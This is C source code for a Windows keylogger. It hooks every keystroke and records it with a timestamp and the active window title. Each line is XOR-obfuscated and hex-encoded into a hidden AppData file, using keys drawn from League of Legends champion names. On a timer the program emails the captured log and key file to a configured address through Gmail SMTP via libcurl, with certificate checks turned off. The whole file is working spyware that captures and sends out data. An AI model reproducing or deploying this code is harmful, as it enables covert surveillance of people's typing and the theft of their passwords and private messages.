#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <time.h>
#include <math.h>
#include <winsock2.h>
#include <string.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <direct.h>

// definitions for setting up the SMTP request
#define SMTP_SERVER "smtp.gmail.com"
#define SMTP_PORT 587
#define BUFFER_SIZE 4096
// SENDER EMAIL AND PASSWORD (using app password)
#define EMAIL "SENDEREMAIL"
#define PASSWORD "APP PASSWORD"
// Message details
#define RECIPIENT "HOST EMAIL"
#define SUBJECT "Subject: Hello from libcurl\n"
#define TEXT2 "This is a test email with an attachment.\n"

// Constants
#define KEY_ARRAY 21
#define MAX_WINDOW_SIZE 256
#define INVALID_SESSION -1
#define NUM_KEYS 169
#define EXPIRED_SESSION -2
#define MAX_LINE_SIZE 1000



// Hook handle - used to set up HOOK for communicating  with keystrokes
HHOOK keyboardHook;
FILE *logFile;
// Standard characters on a keyboard which can be shifted
char standard_shiftable_keys[KEY_ARRAY] = {'`', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '[', ']', '\\', ';', '\'', ',', '.', '/'};
char standard_shifted_keys[KEY_ARRAY] = {'~', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '{', '}', '|', ':', '\"', '<', '>', '?'};

// XOR key array - contains 169 league of legends champions split in 2 arrays to obtain a new key
char *key_arr_one[] = {"Alistar", "Annie", "Ashe", "Fiddlesticks", "Jax", "Kayle", "Master Yi", "Morgana", "Nunu and Willump", "Ryze", "Sion", "Sivir", "Soraka", "Teemo", "Tristana", "Twisted Fate", "Warwick", "Singed", "Zilean", "Evelynn", "Tryndamere", "Twitch", "Karthus", "Amumu", "Cho'Gath", "Anivia", "Rammus", "Veigar", "Kassadin", "Gangplank", "Taric", "Blitzcrank", "Dr. Mundo", "Janna", "Malphite", "Corki", "Katarina", "Nasus", "Heimerdinger", "Shaco", "Udyr", "Nidalee", "Poppy", "Gragas", "Pantheon", "Mordekaiser", "Ezreal", "Shen", "Kennen ", "Garen ", "Akali ", "Malzahar ", "Olaf ", "Kog'Maw ", "Xin Zhao ", "Vladimir ", "Galio", "Urgot", "Miss Fortune", "Sona", "Swain", "Lux", "LeBlanc", "Irelia", "Trundle", "Cassiopeia", "Caitlyn", "Renekton", "Karma", "Maokai", "Jarvan IV", "Nocturne", "Lee Sin", "Brand", "Rumble", "Vayne", "Orianna", "Yorick", "Leona", "Wukong", "Skarner", "Talon", "Riven", "Xerath", "Graves", "Shyvana", "Fizz", "Volibear", "Ahri", "Viktor", "Sejuani", "Ziggs", "Nautilus", "Fiora", "Lulu", "Hecarim"};
char *key_arr_two[] = {"Varus", "Darius", "Draven", "Jayce", "Zyra", "Diana", "Rengar", "Syndra", "Kha'Zix", "Elise", "Zed", "Nami", "Vi", "Thresh", "Quinn", "Zac", "Lissandra", "Aatrox", "Lucian", "Jinx", "Yasuo", "Vel'Koz", "Braum", "Gnar", "Azir", "Kalista", "Rek'Sai", "Bard", "Ekko", "Tahm Kench", "Kindred", "Illaoi", "Jhin", "Aurelion Sol", "Taliyah", "Kled", "Ivern", "Camille", "Rakan", "Xayah", "Kayn", "Ornn", "Zoe", "Kai'Sa", "Pyke", "Neeko", "Sylas", "Yuumi", "Qiyana", "Senna", "Aphelios", "Sett", "Lillia ", "Yone", "Samira", "Seraphine ", "Rell", "Viego", "Gwen", "Akshan", "Vex", "Zeri", "Renata Glasc", "Bel'Veth", "Nilah", "K'Sante", "Milio", "Naafiri", "Briar", "Hwei", "Smolder", "Aurora", "Ambessa"};

// Function prototypes
int session_check(void);
int create_new_session(void);
void encrypt_decrypt_str(char input_str[], char key[], char out_file[]);
void export_session(void);


// Hook procedure -> on keystroke press, run this function
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    boolean caps_on = FALSE;
    boolean shift_on = FALSE;
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *keyInfo = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {

            // getting current time for recording
            struct tm* ptr;
            time_t t;
            t = time(NULL);
            ptr = gmtime(&t);

            // run session check to see if the session is valid
            int XOR_Key = session_check();
            if (XOR_Key == EXPIRED_SESSION) {
                char userProfile[MAX_PATH];
                if (GetEnvironmentVariable("USERPROFILE", userProfile, sizeof(userProfile)) > 0) {
                    char filePath[MAX_PATH];
                    snprintf(filePath, sizeof(filePath), "%s\\AppData\\Local\\Tmp\\data.txt", userProfile);                
                    export_session();
                    fclose(fopen(filePath, "w"));
                }
                // send prvious session over
                XOR_Key = INVALID_SESSION;
            }
            // previous session non-existent
            if (XOR_Key == INVALID_SESSION) {
                XOR_Key = create_new_session();
            }
            // obtain the new XOR key and get the new encoding key (string)
            char *enc_key;
            int key_arr_one_size = sizeof(key_arr_one);
            int key_arr_two_size = sizeof(key_arr_two);
            if (XOR_Key >= key_arr_one_size) {
                XOR_Key -= key_arr_one_size;
                enc_key = key_arr_two[XOR_Key];
            } else {
                enc_key = key_arr_one[XOR_Key];
            }
            // get time and remove trailing newline
            char *timeStr = asctime(ptr);
            timeStr[strcspn(timeStr, "\n")] = '\0';
            
            // checking capslock + shift on
            if (GetKeyState(VK_CAPITAL) & 1) {
                caps_on = TRUE;
            }
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                shift_on = TRUE;
            }
            char full_str[MAX_LINE_SIZE];
            // if key is printable or in printable range
            if (keyInfo->vkCode >= 32 && keyInfo->vkCode <= 126) {
                char curr_char = keyInfo->vkCode;
                // checking caps and shift

                // if the shift key and CAPS is NOT on or BOTH shift and CAPS are on, character should be lowercase

                if (curr_char >= 65 && curr_char <= 90) {
                    if ((shift_on && caps_on) || (!shift_on && !caps_on)) {
                        curr_char += 32;
                    }
                } else {
                    if (shift_on) {
                        for (int i = 0; i < KEY_ARRAY; i++) {
                            if (curr_char == standard_shiftable_keys[i]) {
                                curr_char = standard_shifted_keys[i];
                            }
                        }
                    }
                }
                snprintf(full_str, sizeof(full_str), "<%s> | %c | ", timeStr, curr_char);
            } else {
                snprintf(full_str, sizeof(full_str), "<%s> | [%d] | ", timeStr, keyInfo->vkCode);
            }
            // Retrieve the title of the active window and append it to the current string
            HWND hwndActive = GetForegroundWindow();
            char windowTitle[MAX_WINDOW_SIZE];
            if (hwndActive != NULL) {
                
                GetWindowText(hwndActive, windowTitle, sizeof(windowTitle));
                windowTitle[strcspn(windowTitle, "\n")] = '\0';
                // attach the window name to the full string
                strcat(full_str, windowTitle);
            } else {
                strcat(full_str, "No active Window Found\n");
            }
            char userProfile[MAX_PATH];
            if (GetEnvironmentVariable("USERPROFILE", userProfile, sizeof(userProfile)) > 0) {
                char filePath[MAX_PATH];
                snprintf(filePath, sizeof(filePath), "%s\\AppData\\Local\\Tmp\\data.txt", userProfile);
                encrypt_decrypt_str(full_str, enc_key, filePath);
            }
            // encrypt the full string, save it into specified file
            
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// Function to set the keyboard hook
void SetHook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        return;
    }
}

// main function
int main() {
    // drive system
    char userProfile[MAX_PATH];
    if (GetEnvironmentVariable("USERPROFILE", userProfile, sizeof(userProfile)) > 0) {
        char filePath[MAX_PATH];
        snprintf(filePath, sizeof(filePath), "%s\\AppData\\Local\\Tmp\\", userProfile);
        int mkdir_return = _mkdir(filePath);
        snprintf(filePath, sizeof(filePath), "data.txt");
        logFile = fopen(filePath, "a");
        if (logFile == NULL) {
            return 1;
        }
        // Set the keyboard hook
        SetHook();
        // Message loop
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        // Cleanup
        UnhookWindowsHookEx(keyboardHook);
        fclose(logFile); // Close the log file   
    }
    return 0;
}


// check for valid session, check in info.txt
int session_check(void) {
    FILE *session_file;
    char userProfile[MAX_PATH];
    if (GetEnvironmentVariable("USERPROFILE", userProfile, sizeof(userProfile)) > 0) {
        char filePath[MAX_PATH];
        snprintf(filePath, sizeof(filePath), "%s\\AppData\\Local\\Tmp\\info.txt", userProfile);
        session_file = fopen(filePath, "r");
        if (session_file != NULL) {
            char line[MAX_LINE_SIZE];
            int key;
            if (fgets(line, sizeof(line), session_file) != NULL) {
                // check unix time, determine if the current session is expired
                key = atoi(line);
                time_t curr_unix = time(NULL);
                long start_time = 0;
                if (fgets(line, sizeof(line), session_file) != NULL) {
                    char *endptr;
                    start_time = strtol(line, &endptr, 10);
                    fclose(session_file);
                    if ((start_time + 60 * (ceil(key / 3) + 1)) < curr_unix) {
                        return EXPIRED_SESSION;
                    } else {
                        return key;
                    }
                } else {
                    // no unixtime found
                    return INVALID_SESSION;
                }
            } else {
                // no key found
                fclose(session_file);
                return INVALID_SESSION;
            }
        } else {
            // invalid session, no file found
            return INVALID_SESSION;
        }
    } else {
        return INVALID_SESSION;
    }
}


// generate a random number, create a new session and add the UNIX time
// return the key generated
int create_new_session(void) {
    char *new_key;
    srand(time(NULL));
    int rand_key = rand() % (NUM_KEYS);
    time_t curr_unix = time(NULL);
    FILE *session_file;
    char userProfile[MAX_PATH];
    if (GetEnvironmentVariable("USERPROFILE", userProfile, sizeof(userProfile)) > 0) {
        char filePath[MAX_PATH];
        snprintf(filePath, sizeof(filePath), "%s\\AppData\\Local\\Tmp\\info.txt", userProfile);
        session_file = fopen(filePath, "w");
        if (session_file != NULL) {
            // Adding key, unix time and status to file
            fprintf(session_file, "%d\n", rand_key);
            fprintf(session_file, "%ld\n", curr_unix);
            fprintf(session_file, "1");
            fclose(session_file);
            // return the XOR key
            return rand_key;
        } else {
            return INVALID_SESSION;
        }
    } else {
        return INVALID_SESSION;
    }

}


// encryption for a string -> convert string using XOR key, convert to hexadecimal, append to specified file
void encrypt_decrypt_str(char input_str[], char key[], char out_file[]) {
    FILE *fp = fopen(out_file, "a");
    char enc_str[MAX_LINE_SIZE] = {0};
    int key_len = strlen(key);
    for (int i = 0; i < strlen(input_str); i++) {
        // XOR key section
        int val = input_str[i] ^ key[i % key_len];
        char hex_string[20];

        // HEX section
        sprintf(hex_string, "%02x", val);
        strcat(enc_str, hex_string);
    }
    fprintf(fp, enc_str);
    fprintf(fp, "\n");
    fflush(fp);
    fclose(fp);
}


// MIME email for sending
static const char *headers_text[] = {
    "Date: Tue, 22 Aug 2017 14:08:43 +0100",
    "To: " RECIPIENT,
    "From: " EMAIL " (Example User)",
    "Cc: "  " (Another example User)",
    "Message-ID: <dcd7cb36-11db-487a-9f3a-e652a9458efd@"
        "rfcpedant.example.org>",
    "Subject: example sending a MIME-formatted message",
    NULL
};

static const char inline_text[] =
  "This is the inline text message of the email.\r\n"
  "\r\n"
  "  It could be a lot of lines that would be displayed in an email\r\n"
  "viewer that is not able to handle HTML.\r\n";


// EXPORT a MIME email containing both files to the host machine from the specified gmail account
void export_session(void) {
    CURL *curl;
    CURLcode res = CURLE_OK;
    // initialise curl
    curl = curl_easy_init();
    if(curl) {
        // initialise curl data structures (holds relevant information)
        struct curl_slist *headers = NULL;
        struct curl_slist *recipients = NULL;
        struct curl_slist *slist = NULL;
        curl_mime *mime;
        curl_mime *alt;
        curl_mimepart *part;
        const char **cpp;
        // connection to smtp
        curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com");
        // TLS connection
        curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
        // do NOT verify Peer
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); 

        // authenticate -> provide email and password
        curl_easy_setopt(curl, CURLOPT_USERNAME, EMAIL);
        curl_easy_setopt(curl, CURLOPT_PASSWORD, PASSWORD); 

        // setting up the mail request, MAIL FROM specified email
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, EMAIL);
    
        // add recip to the struct
        recipients = curl_slist_append(recipients, RECIPIENT);
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
    
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT_ALLOWFAILS, 1L);
    
        char userProfile[MAX_PATH];
        if (GetEnvironmentVariable("USERPROFILE", userProfile, sizeof(userProfile)) > 0) {
            char dataPath[MAX_PATH];
            char infoPath[MAX_PATH];
            snprintf(infoPath, sizeof(infoPath), "%s\\AppData\\Local\\Tmp\\info.txt", userProfile);          
            snprintf(dataPath, sizeof(dataPath), "%s\\AppData\\Local\\Tmp\\data.txt", userProfile); 
            printf("\n %s \n %s \n", infoPath, dataPath);         
            /* Build the mime message. */
            mime = curl_mime_init(curl);
            /* Text message. */
            /* Add the current source program as an attachment. */
            part = curl_mime_addpart(mime);
            curl_mime_filedata(part, dataPath);
            curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

            /* Add the current source program as an attachment. */
            part = curl_mime_addpart(mime);
            curl_mime_filedata(part, infoPath);
            curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
            /* Send the message */
            res = curl_easy_perform(curl);
            printf("RES IS %d\n", res);
            /* Check for errors */
            if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));
            // cleanup and free data
            curl_slist_free_all(recipients);
            curl_slist_free_all(headers);   
            curl_easy_cleanup(curl);
            curl_mime_free(mime);           
        }
    }
    return;
}
